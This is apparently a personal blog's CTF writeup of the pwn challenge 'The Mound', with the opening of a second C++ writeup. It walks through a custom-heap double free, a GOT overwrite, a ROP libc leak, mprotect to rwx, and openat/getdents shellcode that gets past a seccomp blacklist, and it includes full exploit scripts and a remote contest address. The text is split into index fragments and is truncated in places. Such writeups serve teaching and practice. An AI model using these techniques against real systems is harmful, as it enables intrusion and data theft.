‚Äútop chunk‚Äù of the mound. 0xdead* stores the metadata for the mound, kind of like what main_arena does in glibc. The structure looks something like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 mound_metadata mound_arena; // cs:0xdead0000000 The new types in there are further defined like so: typedef struct mchunk { size_t id; // rand64() id. size_t sz; // the chunk size (inclusive of metadata) char data[0]; // length is dependent on the size provided to mmalloc() } typedef struct mcache_entry { struct mchunk; // i.e. extend/inherit the mchunk structure here mcache_struct *mcache; // a copy of the mcache for safety verification mcache_entry *next; // next mcache entry; this is a linked list like the tcache. } #define MCACHE_MAX_BINS 0x18 typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } The most interesting part of each mchunk is (in my opinion, anyway) the id element. Every chunk is assigned a random 64-bit UUID (with a very small chance of collision2) upon allocation. When a chunk is freed, that ID gets chucked into the mound_metadata to protect the program against a double-free. This might make a lot more sense if I give a flowchart of how things work: Relevant macros: #define request2size(x) ((-x\u00260xf)+x+0x10) // x rounded up to nearest 0x10, plus 0x10. Applies for -ve numbers too. #define csize2midx(x) ((x\u003e\u003e4)-2) #define chunk2mem(p) ((void*)p+0x10) #define mem2chunk(p) ((void*)p-0x10) I copied and adapted some of these to python as well: def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) With this high-level overview of the implementation in mind, I can return to the previous question: What are the consequences of sending a glibc heap pointer to mfree()? ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:3:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mixing heap allocators Simply freeing a glibc heap pointer will almost certainly produce an exit(1): 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 1 Pile: hi Pile index: 0 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 4 Pile index: 0 Mound: Double free detected The relevant part of the code to check is the find_id(c-\u003eid) call: void find_id(size_t id) { for ( int i = 0; i \u003c= 4095; ++i ) if ( id == mound_arena.ids[i] ) { puts(\"Mound: Double free detected\"); exit(1); } } A typical malloc_chunk looks like this: struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; }; Because c-\u003eid occupies the same space as a malloc_chunk‚Äôs mchunk_prev_size member, the prev_size of the glibc heap chunk is taken as the id in find_id. The glibc chunk pointers allocated by strdup() will never be free, so prev_size == id should always be 0, and find_id(c-\u003eid) should always result in an error given a glibc heap chunk. Or not. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:3:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"The Obvious Solution It takes me a while, but I eventually realise that the preceding paragraph is false. Sequential malloc chunks can use the prev_size field to store user data: This means that if I call strdup(\"A\"*0x17) twice in succession, the first strdup() chunk allocated can be used to overwrite the prev_size of the 2nd strdup() chunk: strdup(b''.rjust(0x17,b'a'), 0) strdup(b''.rjust(0x17,b'a'), 1) edit(0, b''.rjust(0x17,b'a')) Using this method, the interpreted mchunk-\u003eid for a glibc heap chunk can be modified to any value within range(0, 1\u003c\u003c56). # register an arbitrary 56-bit id onto the mound's free id list def reg_id(id: int): strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(id)[:7].rjust(0x17, b'a')) free(0) What are the consequences of this? Adding a new id to mound_arena.ids[] is pretty useless; it would only make allocations harder instead of easier. I could also try to get rid of an ID: def r64(): return randint(0, (1\u003c\u003c64)-1) # generate random ids. Unrelated to rand64bit() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(r64())[:7].rjust(0x17, b'a')) free(1) edit(0, pack(id)[:7].rjust(0x17,b'a')) add(0x10, 2, b'a'*0x10) Then I‚Äôd be able to free the same region of memory twice, like this: from ctypes import CDLL libc = CDLL('libc.so.6') # r = ... libc.srand(libc.time(0)^r.pid) # pid will have to be guessed on remote def rand64bit(): return libc.rand() + (libc.rand()\u003c\u003c32) # ... omitted code ... # ... make sure to account for rand() calls throughout code as well ... while 1: add(sz=0x20, idx=0xf, b'hi') if not ((chunk_id := rand64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) This is a classic tcache dup, except with the mcache instead. Once you accomplish this much, getting to win() isn‚Äôt much of a challenge. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:4:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting to win() Right now, mcache-\u003eentries[1] == [arr[0xf] -\u003e arr[0xf]]. arr[0xf]-\u003enext can be modified to anything, so long as (mcache_entry*)(arr[0xf]-\u003enext)-\u003emcache == mound_arena.mcache. Taking a hint from the the definition, I‚Äôll try to point -\u003enext to mound_arena.mcache-0x10, because it‚Äôs the only non-user-controlled region that happens to have an mcache pointer. add(0x20, 0xe, fit(0xbeef0000010, 0xdead0007ff8)) The linked list here is now [arr[0xf] -\u003e mound_arena+0x7ff8]. As a reminder, the mound_arena looks like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 Right after the mcache is the top pointer. Pulling two items off of the mcache linked list will get the top pointer overwritten with user-controllable data: add(0x20, 0xd, 'hi') add(0x20, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) Here, I‚Äôm overwriting mound_data.top with a GOT pointer to gain RIP control: add(0x40, 0xb, pack(context.binary.sym.win)) # this will overwrite got.scanf() And now the exploit reaches win(): Simple enough, right? ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:4:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"On the lengths I will go to fool myself: a novel, inferior exploit approach Picture this: it‚Äôs the middle of a Saturday afternoon. I‚Äôm looking at gdb in one window, and vim in the next. There‚Äôs a little voice at the back of my head pleading me to attend to lunch and other bodily needs, but my eyes are entranced by the dark abyss of the Hex-Rays‚Ñ¢ decompiler. In short, I‚Äôm not really thinking straight. But what I do notice, in my digital stupor, are the comments I have open in Pseudocode-Q3: I had dismissed the immediate relevance of strdup() with the false reasoning I‚Äôd demonstrated at the end of this section. I even got to work on rationalizing the apparent irrelevancy of case 1/3; my writeup had these lines at one point: It‚Äôs reasonable to assume that strdup() was introduced explicitly as an exploit vector for the challenge, so I can expect that there‚Äôs a way to edit mchunk_prev_size without calling free(). On a wild guess, I expect that the final exploit involves modifying sizes[idx] and overflowing into glibc chunk metadata via case 3. Since there‚Äôs currently no way to move forward with case 1/3, I‚Äôll shift my focus to the other two cases. The bug I spotted here proved to be unnecessary. Altogether, you can solve the challenge without ever noticing the odd behaviour associated with mmalloc(0). Nonetheless, the resulting exploit I cobbled together is interesting, unique enough that I‚Äôd prefer to leave the details available to the public. So, let‚Äôs talk about mmalloc(). ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:5:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"mmalloc() and mfree() mmalloc() is only ever called in case 2: case 2: // add if ( user_sz \u003c= 0xFFF ) { // ... omitted ... if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; mmalloc() itself is defined a little oddly: __int64 *mmalloc(int user_sz) { int chunk_sz = request2size(user_sz); if ( chunk_sz \u003c 0 ) // not sure what the purpose of this is chunk_sz = (-user_sz \u0026 0xF) + user_sz + 31; int midx = csize2midx(chunk_sz); if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } If I expand the macros, the bug becomes more obvious: __int64 *mmalloc(int user_sz) { // 0 \u003c= user_sz \u003c= 0xfff int chunk_sz = (-user_sz\u00260xf)+user_sz+0x10; // 0x10 \u003c= chunk_sz \u003c= 0x1010 if ( chunk_sz \u003c 0 ) /* { ... } ignore */ int midx = (chunk_sz\u003e\u003e4)-2; // -1 \u003c= midx \u003c= 0xff if ( midx \u003c= 0x17 \u0026\u0026 mound_arena.mcache-\u003eentries[midx] ) // possible negative index here!!! return mcache_alloc(user_sz); return top_chunk_alloc(user_sz); } As a reminder, the mcache is structured like this: typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } mcache-\u003eentries[-1] really refers to mcache-\u003ecounts[0x10:0x18]. By filling up the mcache bins for 0x120 \u003c= chunk_sz \u003c 0x1a0, we can get mcache-\u003eentries[-1] to point to any arbitrary location. The subsequent call to mmalloc_alloc(0) has a small safety check, as I showed earlier in the flowchart: __int64 *mcache_alloc(int user_sz) { // user_sz = 0 mcache_struct *mcache_ = mcache; // [rsp+30h] [rbp-10h] int midx = csize2midx(request2size(user_sz)) // midx = -1, [rsp+2Ch] [rbp-14h] mcache_entry *e = mcache-\u003eentries[midx]; // [rsp+20h] [rbp-20h] mcache-\u003eentries[midx] = (mcache_entry *)e-\u003efd; --mcache_-\u003ecounts[midx]; if ( mcache_ != (mcache_struct *)e-\u003emcache ) { // ! need to ensure that (void*)entries[-1][2] == mcache puts(\"Mcache: Invalid verify\"); exit(1); } e-\u003efd = e-\u003emcache = 0LL; remove_id(e-\u003eid); return \u0026e-\u003emcache; } This effectively means that mcache-\u003eentries[-1] needs to point to a known region of user-controlled data, like the mound. I‚Äôll use this bug to allocate a fake chunk with a valid mcache size. def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=0xbeef0000010): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(0x20, 0, fake_mcache_entry(0x100)) add(1, 1, b'a') # chunk to be overflowed fake_mcache_addr = 0xbeef0000100 for i,b in enumerate(pack(fake_mcache_addr)): chunk_sz = 0x120+i*0x10 user_sz = chunk_sz - 0x10 # TODO: how to get b \u003e 0xf? for i in range(b): add(user_sz, 0xf-i, b'garbage') for i in range(b): free(0xf-i) add(0, 2, b'') # trigger bug free(0) There‚Äôs a TODO in there, and I‚Äôll explain. The problem with incrementing mcache-\u003ecounts[0x10:0x18] one-by-one is that there aren‚Äôt enough pointers to go around. By right, if sizeof(arr[]) is only 0x10, the maximum value for mcache-\u003ecounts[] should be 0x10 as well. I struggled with this for a while. The only way to put more pointers onto the mcache is to do a double-free, but the ID verification list got in the way of that. It was about at this point that I gained a partial understanding of the strategy outlined in Fake IDs, and I started work on an odd, roundabout method of achieving much of the same4: # The substance of the exploit: getting mcache-\u003eentries[-1] to point to a fake mchunk for midx,b in tqdm((i+midxs.entries,b) for i,b in enumerate(pack(mound_data.fakechunk)) if b): def pad(s: bytes): return s.rjust(0x17, b'a') strdup(pad(b''), 0xf) # Remember that maximally, user_sz = 8 (mod 0x10) for a given glibc heap chunk. strdup(pad(b''), 0xe) # A string has a trailing nul-byte, so maximally strlen(s) = 7 (mod 0x10) add(midx, 2, b'hi') while (pred := r64bit())\u003e\u003e56: add(midx, 2, b'hi') for _ in range(b): # continually double-free to boost -\u003ecounts[] free(2) edit(0xf, pad(pack(r64())[:7])) free(0xe) edit(0xf, pad(","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:5:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Using win() The seccomp filter for this challenge is mildly interesting. Normally, seccomp‚Äôd binaries have a whitelist for permitted syscalls, but in this situation, there‚Äôs only a blacklist against a few. The blacklisted items give pause for thought: both execve and open are banned, and normally you‚Äôd use the former to pop a shell, and the latter for an open-read-write chain. But before I get ahead of myself, let‚Äôs talk about how to get to arbitrary syscalls first. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:6:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Moving to rwx There aren‚Äôt a lot of gadgets in the main binary, so it might be better to leak libc first. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['read'] = unpack(r.recvline()[:6], 'all') Once that‚Äôs done, I can abuse gadgets in libc to convert the mound_data memory region into an rwx page: R = ROP(context.libc) R.raw(0x48*b'a') R.mprotect(mound_data.base, 0x400000, 7) R.call(mound_data.shellcode) r.sendlineafter(';)\\n', R.chain()) This only makes sense if mound_data.shellcode actually points to an area of user-written shellcode. I handled this by writing shellcode to mound_data using add(), long before the mcache dup happens: # ... everything up until the first few add() calls ... sc = ... # I'm about to cover this part. sc = asm(sc) # don't call asm() twice add(len(sc), 8, sc) # dump shellcode somewhere in mound_data for later use # ... everything else, e.g. getting mcache dup ... Figuring out what shellcode to run isn‚Äôt too difficult, if you have a syscall reference in hand. This challenge shows why you shouldn‚Äôt use a seccomp blacklist: open might be banned, but openat certainly isn‚Äôt. I‚Äôll start off with some shellcode to open the /pwn/ folder: sc = shellcraft.pushstr('/pwn') sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) sc+= 'mov QWORD PTR [{}], rax\\n'.format(0xbeef0000000) sc+= shellcraft.getdents64('rax', 0xbeef0010000, 0x10000) # use getdents() to list a directory After that, I‚Äôll apply a basic assembly loop to search for .txt: sc+= shellcraft.mov('rax', 0xbeef0010000) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(u32('.txt')) sc+= 'jne loop\\n' # End result: *(int*)rax == u32(\".txt\") Since the flag‚Äôs filename is always 0x20+4 bytes long, the beginning of the flag filename will be at rax-0x20 , and I can use openat again to write the flag to stdout: sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(0xbeef0000000) sc+= shellcraft.openat('rax', 'rbx', 0) # i.e. shellcraft.cat('rbx'), but sc+= shellcraft.read('rax', 0xdead0000000, 100) # because pwntools uses SYS_open sc+= shellcraft.write(1, 0xdead0000000, 100) # I have to do this in 3 lines. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:6:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Getting the flag For reference, this is what the full script should look like at this point: from random import randint from collections import namedtuple from ctypes import CDLL from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers O_DIRECTORY, FLAG_LEN = 0x10000, 100 # use reasonably long values here sc = '' # step 1: getting a directory listing sc+= shellcraft.pushstr('/pwn') # put \"/pwn\" on the stack sc+= shellcraft.openat(0, 'rsp', O_DIRECTORY) # use openat in lieu of open. rsp because of pushstr sc+= 'mov QWORD PTR [{}], rax\\n'.format(mound_data.base) # Store the resultant fd _somewhere_ accessible (mound_data.base) sc+= shellcraft.getdents64('rax', mound_data.dents, 0x10000) # use getdents to list directory # step 2: loop through the dents data to find the flag filename sc+=shellcraft.mov('rax', mound_data.dents) sc+= 'loop:\\n' sc+= 'inc rax\\n' sc+= 'cmp DWORD PTR [rax], {}\\n'.format(hex(u32('.txt'))) sc+= 'jne loop\\n' # step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(mound_data.base) sc+= shellcraft.openat('rax', 'rbx', 0) sc+= shellcraft.read('rax', mound_arena.base, FLAG_LEN) sc+= shellcraft.write(1, mound_arena.base, FLAG_LEN) sc = asm(sc) # don't call asm() twice add(1+csize2midx(request2size(len(sc))), 8, sc) # dump shellcode somewhere in mound_data for later use # The Obvious Solution: mcache dup --\u003e mound_arena.top overwrite --\u003e GOT table edit to win() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 5) strdup(b'a'*0x17, 6) edit(midxs.prev_size_editor, pack(r64())[:7].rjust(0x17, b'a')) free(midxs.fakeid_provider) edit(midxs.prev_size_editor, pack(id)[:7].rjust(0x17,b'a')) add(midxs.strdup, 7, b'a'*0x10) for _ in range(3): r64bit() # There have been 3 rand64bit() calls so far; account for them. while 1: # try adding until there's an ID with a null MSB add(midxs.mcache_dup, 0xf, b'hi') if not ((chunk_id := r64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) # mcache dup add(midxs.mcache_dup, 0xe, fit(mound_data.mcache, mound_arena.mcache-0x10)) # overwrite -\u003enext add(midxs.mcache_dup, 0xd, 'hi') add(midxs.mcache_dup, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) # overwrite .top add(midxs.got_overwriter, 0xb, pack(context.binary.sym.win)) # overwrite got['scanf'] # win() will execute. Leak libc in the first cycle. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['rea","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:6:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mistakes [Content warning: unsubstantiated opinions] ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"I. Pwn isn‚Äôt RE CTF pwn binaries are usually small enough to fully reverse engineer, and The Mound was no exception. But the reversing effort always arrives with the cost of Time. The entire section of this writeup dedicated to understanding the heap implementation was written during the 36-hours between me starting this challenge and mound.py spitting out the flag. The assumption I‚Äôve been rolling with, in all of the pwnables do, is that boosting time(reversing binaries) will pay off by a comparable reduction in time(scripting and debugging). That belief didn‚Äôt work out for this challenge. At the end of the main() reversing effort, I noted that I observed a few Bad Things going on in the switch-cases. So I spent a thousand-or-so words reversing the interworkings of the mound to understand that sending a glibc pointer to mfree() tends to produce Double free exit(1) calls as a result of a null prev_size. Do you know how else I could‚Äôve discovered that? By just testing out the damn thing and getting a backtrace: gdb.attach(r, gdbscript='b exit\\nc') strdup(b'hi', 0) free(0) r.interactive() Oh, look! It stops in find_id(). Which only stops because *((void*)p-0x10) == NULL for the p in mfree(p). So I should probably find a way to edit prev_size for one of the strdup()‚Äôd pointers. Five minutes to figure out something I spent 5 hours in IDA Pro for. There are situations where a myopic focus on testing crashes might not work out, but The Mound is certainly not one of them. I can‚Äôt speak for ptr-yudai, but judging by his long article on adapting fuzzing techniques for CTF pwnables, I expect that there‚Äôs a lot more to gain from a lucid application of dynamic analysis than there is from my oddball approach of eyeballing everything I can in IDA until something sticks. I might re-evaluate this section if someone comes around with a really fast CTF Reversing strategy, but until then: ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"II. Pattern matching CTF challenges are full of patterns and trends. When one popular CTF introduces a unique challenge, other CTFs tend to ape6 after the original design. v8 challenges are a good example of this: Prior to 2018, nothing. This year, there‚Äôs already been 4+ CTFs with v8 challenges. Compare this with a graph of Chrome‚Äôs market share: The IRL relevance of v8 hasn‚Äôt changed (much), so what gives? There‚Äôs a good comparison to be made between CTF trends and memetic reproduction. An established CTF comes up with an interesting challenge design. A decade or so ago, this might‚Äôve been ‚ÄúReturn Oriented Programming‚Äù. Go back a few years and you‚Äôll see everyone interested in nifty House of * exploits. In the past few years, there‚Äôs been an obsession with things like v8 oobs and printf() one-shots. This is an intentionally broad picture; the trends I‚Äôve listed here are cherry-picked obvious ones. There are smaller, less identifiable trends, and these weaker trends are a part of why I went down the weird exploit path I did for The Mound. Instinctively, I try to pull meta-games using the trends I observe. If it‚Äôs a v8 challenge, I try to get an oob JSArray, even though that kind of stuff is a lot harder with contemporary security measures. If there‚Äôs a text input, I‚Äôll bash in \"A\"*0x1000 for the sake of it. And if there‚Äôs a special number that‚Äôll produce a negative array index ‚Äî a smaller pattern that I‚Äôve unfortunately internalised ‚Äî I‚Äôll do my best to shape my exploit into abusing it, even if I have to use more powerful primitives to get there. It was with this bias that I approached The Mound, even after I learnt how to double-free a mound allocated chunk. I understood on a subconscious level that a double-free was almost certainly a more powerful tool than what I wanted to swing it around for (incrementing mcache-\u003ecounts[]), but if it follows what I‚Äôve seen before, I have an expectation that things will go the same way. I‚Äôll admit that this is a little bit theoretical, but I would have saved a lot of time if I could‚Äôve just convinced myself to abort with the mcache-\u003eentries[-1] exploit path early on. I‚Äôm not exactly sure what I can do to prevent this kind of thing in the future, either. Something that deserves more thought. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"III. Things I haven‚Äôt considered? I could be doing pwn in sub-optimal ways I can‚Äôt identify as sub-optimal on my own. I‚Äôm hoping that other writeups on this challenge (if they arrive) can provide the kind of external insight on how challenges can be solved faster. That‚Äôs it. ","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:7:3","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Footnotes This isn‚Äôt particularly useful. There‚Äôs no way to leak pointers outside of win(). I tried looking for seeds that would produce repeated cycles: from ctypes import CDLL LIBC = CDLL('libc.so.6') t = LIBC.time(0) t \u0026= 0xffffffffffff0000 for i in range(t,t+0xffff): LIBC.srand(i) seen = set(LIBC.rand() for j in range(0x1000)) if len(seen) \u003c 0xff0: print(i, len(seen)) The script found nothing. In case you‚Äôre wondering how there‚Äôs a pseudocode reference to mound_arena.mcache-\u003eentries[], as opposed to an ugly red *(_QWORD *)(MEMORY[0xDEAD0008008] + 8 * (v3 + 2LL) + 8) reference: Define the mound_metadata class (and the other structs from here) in the Structures tab; you should see an entry like this in the local types tab (Shift+F1): In the IDA View tab, select Edit --\u003e Segments --\u003e Create Segment; fill the pop-up window with sensible values put a variable at mound_arena:00000DEAD0000000 and retype it (Y) as a mound_metadata. The code block there isn‚Äôt supposed to make sense. Throughout the writeup, I‚Äôve tried to keep declarations and variables consistent across code snippets, but getting this code to match with everything else in the writeup is just a little bit intractable. This is the reason why I ended up searching for the intended solution. My silly alternative method for getting to win() doesn‚Äôt work on remote; the time cost associated with a single connection ‚Äì let alone bruteforcing the PID ‚Äì makes it impossible to increment mcache-\u003eentries[-1] without an absurdly low ping. The 30x number comes from a crude measure of how many times the exploit calls choose(). For the intended solution, it‚Äôs about a hundred. The negative indexing process takes around ~3000 calls on average, and this shakes out to an exploit duration of around 15 minutes per guess on remote. Feel free to try it out youself: from random import randint from collections import namedtuple from ctypes import CDLL from tqdm import tqdm from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) if args.REMOTE: r = remote('193.57.159.27', 41932) #r = remote('localhost', 8329) libc.srand(t^int(args.PID)) # bruteforce PID else: r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers midxs = namedtuple('midb', 'first_alloc overflower incrementer fakechunk bugged got_overwriter entries')(1, 4, 0, 2, -1, 3, 0x10) mound_data = namedtuple('beef', 'base mcache fakechunk dents shellcode')(BEEF, BEEF+0x10, BEEF+0x100, BEEF+0x10000, BEEF+0x190) def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=mound_data.mcache): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(midxs.first_alloc, 0, fake_mcache_entry(sz=midx2csize(midxs.fakec","date":"August 9, 2021","objectID":"/blog/rarctf-2021-the-mound/:8:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/blog/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Understanding C++ move semantics in the context of a CTF challenge.","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Like most beginners in pwn, I‚Äôve only a passing familiarity with cpp binary exploits1. This writeup targets beginners with little-to-no C++ exploitation background, and you can skip to the TL;DR at the end if you just want the solution. ","date":"July 11, 2021","objectID":"/blog/redpwn-2021-panda-food/:0:0","tags":["writeup","pwn"],"title":"C++ Smart Pointer UAFs: redpwn 2021's panda-food","uri":"/blog/redpwn-2021-panda-food/"},{"categories":["CTF"],"content":"Challenge details Author: NotDeGhost When in doubt, hijack a vtable nc mc.ax 31707 Files: Dockerfile (implies libc6_2.27-3ubuntu1.4_amd64) Makefile ( -O3 -static-libstdc++ -static-libgcc) chall [*] 'chall' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled chall.cc (slightly minified) #include \u003ciostream\u003e #include \u003cstring\u003e #include \u003cbits/stdc++.h\u003e #include \u003cunistd.h\u003e #include \u003csys/stat.h\u003e #include \u003cfcntl.h\u003e class Food { public: Food(std::string name) : name_(std::move(name)) {} virtual void Eat() { std::cout \u003c\u003c \"om nom nom\" \u003c\u003c std::endl; } void PrintName() { std::cout \u003c\u003c \"name: \" \u003c\u003c name_ \u003c\u003c std::endl; } std::string name_; }; class Bamboo : public Food { public: Bamboo(const 